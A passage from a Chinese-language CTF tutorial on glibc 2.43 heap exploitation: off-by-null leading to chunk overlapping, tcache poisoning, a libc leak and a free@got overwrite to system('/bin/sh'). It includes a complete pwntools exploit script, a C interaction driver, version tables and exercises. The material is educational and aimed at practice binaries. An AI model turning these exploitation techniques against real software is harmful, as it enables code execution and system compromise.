| 5 | 合并块起点 = A_mem，大小 0x4f0 + 0x500 = 0x9f0，进 unsorted | ==槽 0 还指着 A_mem==：一个已分配槽位与一个空闲大块重叠——chunk overlapping 到手 |

$$P = B_{chunk} - \text{prev\_size} \tag{13.1}$$

unlink 在 [[P12-glibc堆管理机制#6.1 后向合并：PREV_INUSE 为 0 时吃掉前块|P12 6.1]]里列过三道检查，伪造的数据逐条对应：

| unlink 的检查 | 本构造的值 | 为什么能过 |
| ---- | ---- | ---- |
| `fd->bk == p` | P->fd = P，且 P+0x18 处写的也是 P | 自指假块：fd 指向自己，"自己的 bk 位置"自然存着自己的地址 |
| `bk->fd == p` | P->bk = P，且 P+0x10 处写的也是 P | 同上 |
| `chunksize(P) == prev_size(next_chunk(P))` | 0x4f0 == prev_size(B_chunk) | B 的 prev_size 是 edit(A) 写进去的 0x4f0，两边天然一致 |

edit(A) 一次写入的完整排布（0x4f8 字节，末尾补 `\0`）：

```text
 偏移        内容                      含义
 [0x00]      0                        P 的 prev_size（检查不看它，占位）
 [0x08]      0x4f1                    P 的 size：0x4f0 | PREV_INUSE
 [0x10]      &P                       P 的 fd = 自指
 [0x18]      &P                       P 的 bk = 自指
 [0x20]      0、0                     fd_nextsize / bk_nextsize 置 NULL
 [0x28..]    0 填充
 [0x4f0]     0x4f0                    B 的 prev_size，指向 P
 [0x4f8]     补写的 '\0'               B 的 size 最低字节：0x501 → 0x500
```

> [!info]- fd_nextsize 为什么必须置零
> P 的伪造尺寸 0x4f0 落在 largebin 范围（≥ 0x400），unlink 对这个量级的块会多看一眼 fd_nextsize：非空就走 largebin 分支、按 nextsize 环摘链，伪造数据对不上当场报 `corrupted double-linked list`。置成 NULL，代码跳过整个分支，只做基础三查。这个细节在 [[P15-House系列攻击技术|P15]]构造 largebin 假块时还会反复出现。

### 5.4 完整利用：重叠之后走到 getshell

重叠到手后，后面全是我们已经会的动作：从合并块上切两块、把其中一块 free 进 tcache、经槽 0 改它的 fd、poisoning 分配到指针数组、泄露 libc、改 free@got、触发。

```python
#!/usr/bin/env python3
# exp_obn.py —— off-by-null → chunk overlapping → libc 泄露 → getshell（glibc 2.43）
from pwn import *
from sys import argv
import time

context.log_level = 'info'
BIN = argv[1] if len(argv) > 1 else './p13_obn'
elf = ELF(BIN, checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
p = process(BIN, stderr=STDOUT)

def create(idx, size, data):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    p.sendlineafter(b'size >> ', str(size).encode())
    p.sendafter(b'data >> ', data)

def edit(idx, data):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    p.sendafter(b'data >> ', data)

def show(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    return p.recvn(0xf8)   # 本程序 show 打印 0xf8 字节

def delete(idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'idx >> ', str(idx).encode())

# ---- 1. 布局：A(0x500) B(0x500) C(0x90 守卫) D(0x90 泄露用) ----
create(0, 0x4f8, b'A'*8)
create(1, 0x4f8, b'B'*8)
create(2, 0x88,  b'C'*8)
create(3, 0x88,  b'D'*8)

# ---- 2. free(D)，经 show(C) 读出 D 的 fd 槽 = 堆页号 ----
delete(3)
raw = show(2)
heap_page = u64(raw[0x90:0x98])       # D_mem 在 C_mem 前方 0x90 处
heap_base = heap_page << 12
a_mem = heap_base + 0x10
b_mem = heap_base + 0x510
e_mem = heap_base + 0xb0              # 第 6 步切出来的 E
print('[泄露] D 的 fd 槽 = %#x → 堆基址 = %#x' % (heap_page, heap_base))

# ---- 3. 把 D 取回，让 tcache[0x90] 清空 ----
create(3, 0x88, b'D'*8)

# ---- 4. edit(A)：伪造假块 P = A 自己的数据区，并清掉 B 的 PREV_INUSE ----
payload  = p64(0) + p64(0x4f1) + p64(a_mem) + p64(a_mem) + p64(0) + p64(0)
payload  = payload.ljust(0x4f0, b'\x00') + p64(0x4f0)
edit(0, payload)
print('[构造] P = %#x（A 的数据区），B 的 PREV_INUSE 已清零' % a_mem)

# ---- 5. free(B)：backward merge 吃掉假块 P，合并块起点 = A_mem ----
delete(1)
print('[重叠] 合并块 0x9f0 @ %#x，而槽 0 还指着这里：slot0 与空闲块重叠' % a_mem)

# ---- 6. 从合并块上切两块：slot4 = A_mem+0x10，E = A_mem+0xa0 ----
create(4, 0x88, b'E'*8)               # unsorted 切分，拿到合并块头部
create(5, 0x88, b'F'*8)               # last_remainder 再切一刀，E 紧挨在后
delete(5)                             # E 进 tcache[0x90]，fd 槽 = E_mem>>12

# ---- 7. 经 slot0 改 E 的 fd：poison 到 &slots[0] ----
tgt = elf.symbols['slots']
assert tgt % 16 == 0
print('[目标] &slots[0] = %#x' % tgt)
edit(0, b'G'*0xa0 + p64(tgt ^ (e_mem >> 12)))

# ---- 8. 两次 create：第二次把 &slots[0] 当块交付，写入 free@got ----
create(5, 0x88, b'H'*8)                        # 弹出 E
free_got = elf.got['free']
create(6, 0x88, p64(free_got))                 # 弹出 &slots[0] → slots[0] = free@got
got_raw = show(0)
leak = u64(got_raw[:8])
base = leak - libc.symbols['free']
print('[泄露] free@got = %#x → libc 基址 = %#x（低 12 位 %#x）' % (leak, base, base & 0xfff))
assert base & 0xfff == 0, '基址没有页对齐'

# ---- 9. 经 slots[0] 改 free@got → system（其余字节按原值写回）----
edit(0, p64(base + libc.symbols['system']) + got_raw[8:0x88])
print('[改写] free@got -> system @ %#x' % (base + libc.symbols['system']))

# ---- 10. "/bin/sh" + delete：free(ptr) 变 system("/bin/sh") ----
create(7, 0x18, b'/bin/sh\x00')
delete(7)
time.sleep(0.5)
p.sendline(b'echo P13-SHELL-OK; id')
print(p.recvline().decode(errors='replace').rstrip())
print(p.recvline().decode(errors='replace').rstrip())
p.close()
```

最后两行是 exploit 进入交互后 shell 执行 `echo` 与 `id` 的回显——`delete` 调用的 `free@plt` 顺着 [[P03-ELF链接与延迟绑定|P3]]讲的 GOT 查到的是 `system`，参数恰好是槽里那块写着 `"/bin/sh"` 的内存。全链十个动作，三个阶段：

**阶段一：重叠（第 1–5 步）**。泄露堆页号后，一次 edit 同时完成假块伪造与标志位清零；free(B) 触发后向合并，unlink 对着伪造数据三查全过。合并块从 A_mem 开始、长 0x9f0，而槽 0 是一个合法的在册槽位——==一个槽与一个空闲大块重叠，"无 UAF"的题目从此有了 UAF 的全部能力==。

**阶段二：切分与 poisoning（第 6–8 步）**。malloc(0x88) 在 unsorted 里对不上精确尺寸，0x9f0 的合并块被搬进 largebin 再按最佳适配切分，前 0x90 交付、余块登记为 last_remainder——第二次 malloc 走 last_remainder 直切（[[P12-glibc堆管理机制#8. 一条 malloc/free 序列的全程跟踪|P12 第 8 节]] K 阶段的同款行为），E 落在 A_mem+0x90，正好在槽 0 的写程之内。free(E) 进 tcache 后，槽 0 偏移 0xa0 处就是它的 fd 槽，写入 `目标 ^ (E_mem >> 12)` 完成 poisoning；两次 create，`&slots[0]` 被当作块交付，create 的数据读入把 `free@got` 的地址写进 `slots[0]`。

**阶段三：泄露与 getshell（第 8–10 步）**。`show(0)` 打印的不再是堆，而是 `free@got` 开始的 0xf8 字节——free 被此前的 delete 调用过，GOT 里躺着力解析后的真实地址；减去偏移得基址，低 12 位为 0 的校验通过（[[P07-ret2libc-ret2syscall-ret2shellcode#3. ret2libc：两次交互范式|P7 第 3 节]]的排错闸）。`edit(0)` 把 `system` 写进 `free@got`，其余 GOT 字节按 show 读回的原值写回——这一写横跨 0x88 字节，不想动的表项必须原样奉还。最后 create 一块写入 `"/bin/sh"`，delete 触发：`free(ptr)` 变成 `system("/bin/sh")`。

两个工程细节值得记：

- **为什么分两块切，不直接从合并块里改 fd**：合并块在 unsorted 里，改 unsorted 的 fd 是另一族打法且在现代 glibc 上已被检查封死；先切出小块让它进 tcache，才有本节的 poisoning。==重叠给的是地盘，poisoning 要的链在 tcache 里==。
- **落点 `&slots[0]` 而不是其他槽位**：poisoning 分配到指针数组后，靠 create 的数据读入给槽位赋值，而赋过值的槽才有 `sizes[idx]` 可供 edit 使用——第 0 槽在布局阶段 create 过，`sizes[0] = 0x4f8`，天然满足。[[P14-tcache与fastbin利用#4. tcache 的账本：num_slots 与结构本体|P14 第 4 节]]讲的"落点选 tcache 结构本体"是同一类考虑。

## 6. 版本注记：经典打法与本机 2.43

经典堆题大多成文于 glibc 2.27/2.31 时代，题解里的默认环境与本机 2.43 有整代差距。与本章四类漏洞直接相关的差异：

| 行为 | 2.27 / 2.31（经典题解环境） | 本机 2.43 |
| ---- | ---- | ---- |
| tcache 每档上限 | 7（装满一档要 7 次 free） | ==16==，布局步距整个改变（[[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]]） |
| tcache key | 2.27 无；2.31 有，值 = tcache 结构地址，堆上读得到 | 随机值，只能改 key 或换道（第 3 节） |
| safe-linking | 无：fd 是明文，show 直接读出堆地址 | 有（2.32 起）：读到的是加密值，先拿页号再解密（第 2 节） |
| `__malloc_hook` / `__free_hook` | 存在，任意写一个地址即劫持 | 2.34 起不存在，改走 GOT、exit handler、FSOP（[[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里\|P14 第 8 节]]） |
| fastbin | 存在，小块的第二站，A-B-A triple free 的舞台 | 整体移除（[[P12-glibc堆管理机制#3.6 fastbin：已经退场的经典机制\|P12 3.6]]） |
| tcache 结构分配时机 | 首次 malloc，固定是堆上第一个块（偏移可写死） | 首次 free，位置不固定，先定位再打 |
| unlink 检查 | 三道齐全（2.29 起加 `chunksize == prev_size`） | 相同，本机第 5 节现场过检 |
| off-by-null 靶块 | 教材常用 0x421 → 0x400 的缩块形态 | 同款打法直接可用；本节用 0x501 → 0x500 只清标志 |

一句话概括：==思路不变，步长与密码学变了==。老题解的"free 7 次装满 tcache""show 直接读地址""改 `__free_hook`"，在本机分别换成"free 16 次""先解密""换落点"。完整换算法在 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]与 [[P14-tcache与fastbin利用#9. 各技术的版本适用表|P14 第 9 节]]。

拿 docker 拉一个 ubuntu:20.04（glibc 2.31）就能把"明文 fd"亲手比出来。靶子还是 1.2 的 `p13_menu.c`，交互驱动换成一份不依赖 pwntools 的 C 小程序（容器里装 pwntools 太慢）：

```c
/* driver231.c —— 2.31 容器内的交互驱动（纯标准库，替代 pwntools 的角色）
 * 流程与 exp_uaf.py 相同：create 两块、free、show，读回 fd 槽的原始 8 字节
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>

static int in_fd, out_fd;

static void until(const char *tag) {
    size_t tlen = strlen(tag);
    char win[64];
    size_t wlen = 0;
    char c;
    while (read(out_fd, &c, 1) == 1) {
        if (wlen < sizeof(win)) {
            win[wlen++] = c;
        } else {
            memmove(win, win + 1, wlen - 1);
            win[wlen - 1] = c;
        }
        if (wlen >= tlen && memcmp(win + wlen - tlen, tag, tlen) == 0)
            return;
    }
    fprintf(stderr, "EOF while waiting for %s\n", tag);
    exit(1);
}

static void sendline(const char *s) {
    write(in_fd, s, strlen(s));
}

static void readraw(char *dst, size_t n) {
    size_t got = 0;
    while (got < n) {
        ssize_t r = read(out_fd, dst + got, n - got);
        if (r <= 0) exit(1);
        got += (size_t)r;
    }
}

static void create(int idx, int size, const char *data) {
    char cmd[32];
    until(">> ");   sendline("1\n");
    until("idx >> ");  snprintf(cmd, sizeof(cmd), "%d\n", idx);  sendline(cmd);
    until("size >> "); snprintf(cmd, sizeof(cmd), "%d\n", size); sendline(cmd);
    until("data >> "); write(in_fd, data, 8);
}

static void show(int idx, char *dst) {
    char cmd[32];
    until(">> ");   sendline("3\n");
    until("idx >> ");  snprintf(cmd, sizeof(cmd), "%d\n", idx);  sendline(cmd);
    readraw(dst, 8);
}

static void destroy(int idx) {
    char cmd[32];
    until(">> ");   sendline("4\n");
    until("idx >> ");  snprintf(cmd, sizeof(cmd), "%d\n", idx);  sendline(cmd);
}

int main(void) {
    int pin[2], pout[2];
    char v0[8], v1[8];
    unsigned long a, b;
    pipe(pin);
    pipe(pout);
    pid_t pid = fork();
    if (pid == 0) {
        dup2(pin[0], 0);
        dup2(pout[1], 1);
        dup2(pout[1], 2);
        execl("./p13_menu231", "p13_menu231", (char *)NULL);
        _exit(127);
    }
    in_fd = pin[1];
    out_fd = pout[0];
    close(pin[0]);
    close(pout[1]);

    create(0, 0x88, "AAAAAAAA");
    create(1, 0x88, "BBBBBBBB");
    destroy(0);
    show(0, v0);
    destroy(1);
    show(1, v1);

    memcpy(&a, v0, 8);
    memcpy(&b, v1, 8);
    printf("2.31 show(0) after free(A): %#lx\n", a);
    printf("2.31 show(1) after free(B): %#lx  <- 明文堆地址，无 safe-linking\n", b);
    kill(pid, SIGKILL);
    wait(NULL);
    return 0;
}
```

## 7. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| show 读出的 fd 是 `0` 或一个"不像地址的小数" | 都是空链形状：2.31 是 NULL，2.43 是堆页号（第 6 节对照）。不是坏了，页号左移 12 位就是堆基址 |
| 给 0x88 的块做 off-by-null，free 报 `free(): invalid size` | 低位清零把 size 直接清成 0（5.1 的 warning）；靶子换成大块（raw 最低字节只有标志位的 0x501 类） |
| 同一块 free 两次直接 Aborted，输出 `double free detected in tcache 2` | key 检测，排在 free 流程靠前位置（3.1）；UAF 改 key（3.2）或装满该档换道（[[P14-tcache与fastbin利用#7. tcache stashing unlink attack：2.43 上依然成立\|P14 第 7 节]]） |
| 改 key 后再 free 不报错了，但之后的 malloc 崩溃或拿到怪地址 | edit 的 0x10 字节把 fd 槽也盖了：fd 要按当前链写回加密值，空链形状的存储值就是泄露的页号（3.2） |
| 溢出改了邻居 fd，第二次 malloc 没落到目标 | fd 忘了按 `目标 ^ (存储位置 >> 12)` 加密，或异或量用了别的槽的地址；逐项对照 [[P14-tcache与fastbin利用#3.4 第三步：伪造 fd，把目标挂进链\|P14 3.4]] |
| poisoning 后报 `malloc(): unaligned tcache chunk detected` | 目标地址没有 0x10 对齐（弹出时的对齐检查）；换对齐落点 |
| 分配到 `&slots[k]` 写入后，show(k) 却显示 empty | 弹出目标的 key 清零动作会把目标 +8 处写成 NULL，那是相邻槽位（[[P14-tcache与fastbin利用#3.4 第三步：伪造 fd，把目标挂进链\|P14 3.4]]的 warning）；落点选"赋过值、其后槽位可弃"的位置 |
| backward merge 报 `corrupted size vs. prev_size` | 假块 size 与 prev_size 不自洽：`chunksize(P)` 必须等于 `prev_size(next_chunk(P))`（5.3 的对照表第三行） |
| backward merge 报 `corrupted double-linked list` | 假块的 fd/bk 没有自指：P 的地址要同时写进 P+0x10 与 P+0x18；≥ 0x400 的假块还要把 fd_nextsize 置 NULL（5.3 的折叠框） |
| 合并后 malloc(0x88) 拿到的不是合并块切出来的地址 | 合并块在 unsorted，但该档 tcache 里还有别的块——malloc 第 1 步先弹 tcache（[[P12-glibc堆管理机制#4. malloc 的主干流程\|P12 第 4 节]]）；先把该档清空再触发切分 |
| 改 free@got 后程序崩在某个无关函数里 | edit 一次写了 0x88 字节，横跨整排 GOT：不想动的表项要按 show 读回的原值写回（5.4 的阶段三） |
| exploit 卡在某一步不动 | scanf（stdio）与 read（文件描述符）混用时整批发送被吸进缓冲：逐提示符同步（1.3，机理见 [[P10-整数溢出与off-by-one#2. 模式一：有符号长度检查被负数绕过\|P10 第 2 节]]） |
| 泄露的 free 地址算出的基址不对 | 基址 = 泄露值 − 该版 libc 的 free 偏移，低 12 位必须是 0；不为 0 说明少收字节或 libc 版本不匹配（[[P03-ELF链接与延迟绑定#6. libc 识别与版本匹配\|P3 第 6 节]]） |

## 8. 配套练习与延伸阅读

> [!note] 实战任务：四道基础堆题
> 在 BUUCTF 或 NSSCTF 上按标签检索，四道题分别对应本章四类漏洞，全部走到 getshell 或读 flag：
> ① 标签 UAF / note 类的菜单题（题目环境多为 2.23/2.27）：按第 2 节的流程打。这些版本没有 safe-linking，show 读到的就是明文地址——脚本去掉解密两行即可；遇到连 tcache 都没有的 2.23，free 的小块进 fastbin，按 fastbin 的单链形状理解（[[P12-glibc堆管理机制#3. bins：释放后的 chunk 都去哪里\|P12 第 3 节]]）。
> ② 带 double free 标签的题：先判断它的 glibc 版本对应哪种检测（第 6 节的表），再选改 key、A-B-A 或换道，动手前把选择的理由写下来。
> ③ 标签 off-by-one / off-by-null 的题：动键盘前先在纸上画 A/B/C 的布局，标出 prev_size、size、假块 P 三处要写的值——第 5 节的构造对账目要求高，纸上算清了键盘上才不返工。
> ④ 修复练习：把本章三个靶子程序各修掉对应漏洞（delete 清指针、edit 查 sizes、readn 删掉补 `\0`），重新编译后跑原 exploit，观察它分别死在哪一步——每个"修好的版本"都是一面镜子，照出原利用依赖的每一环。

延伸阅读按用途分三档：

- **源码**：glibc 的 `malloc/malloc.c`——本章用到的 `tcache_put`/`tcache_get`、`_int_free` 的合并路径（`_int_free_merge_chunk`）与 `unlink_chunk` 都在这一个文件里，[[P12-glibc堆管理机制#11. 配套练习与延伸阅读|P12 第 11 节]]的阅读指引继续适用。
- **社区仓库**：shellphish 的 how2heap（GitHub）按攻击技术组织最小示例，`poison_null_byte`、`tcache_dup` 与本章第 3、5 节同源；多数示例基于旧版 glibc，对照 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]的表换算后再跑。
- **后续章节**：tcache poisoning 的完整兑换与 fastbin 历史环境 → [[P14-tcache与fastbin利用|P14]]；House 系列与 largebin 攻击 → [[P15-House系列攻击技术|P15]]；伪造 IO_FILE 劫持控制流 → [[P16-FSOP与HouseofApple2|P16]]；把布局账本当通用解题工具 → [[P17-堆风水与通用利用思路|P17]]；getshell 收尾的 ret2libc 与 one_gadget → [[P07-ret2libc-ret2syscall-ret2shellcode|P7]]，libc 版本匹配 → [[P03-ELF链接与延迟绑定|P3]]。
